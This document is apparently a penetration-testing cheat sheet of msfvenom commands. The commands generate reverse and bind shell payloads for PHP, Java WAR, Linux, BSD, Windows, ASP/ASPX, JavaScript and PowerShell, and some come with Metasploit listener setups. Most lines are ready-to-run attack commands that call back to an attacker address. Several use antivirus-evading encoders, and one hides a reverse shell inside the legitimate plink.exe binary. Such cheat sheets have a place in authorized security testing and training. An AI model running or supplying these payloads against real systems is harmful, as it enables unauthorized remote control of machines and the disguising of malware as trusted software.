# MSFVenom Payloads 

<h1 align="center">
  <a href="https://github.com/kraloveckey/venom/penetration-testing"><img src="../images/img/hack-logo.png" width=150 height=140 lt="Cyber Cheat Sheet"></a>
</h1>

[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/kraloveckey)

[![Telegram Channel](https://img.shields.io/badge/Telegram%20Channel-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/cyber_notes)

---

```shell
$ msfconsole -q
```

### PHP reverse shell  
```msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php```

### Java WAR reverse shell  
```msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war```

### Linux bind shell  
```msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai```

### Linux reverse shell
```msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o pay```

``` msfconsole -q
>> use payload/linux/x86/shell_reverse_tcp
>> set LHOST 10.10.10.10
>> exploit
```

### Linux FreeBSD reverse shell  
```msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf```

### Linux C reverse shell  
```msfvenom  -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f c```

### Windows non staged reverse shell  
```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe```

### Windows Staged (Meterpreter) reverse shell  
```msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe```

### Windows Python reverse shell  
```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f python -o shell.py```

### Windows ASP reverse shell  
```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp```

### Windows ASPX reverse shell
```msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx```

### Windows JavaScript reverse shell with nops  
```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f js_le -e generic/none -n 18```

### Windows Powershell reverse shell  
```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1```

### Windows reverse shell excluding bad characters  
```msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai```

### Windows x64 bit reverse shell  
```msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe```

or

```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4443 -f exe -o shell.exe```

``` 
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost tun0
set lport 4443
run
```

### Windows reverse shell embedded into plink  
```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe```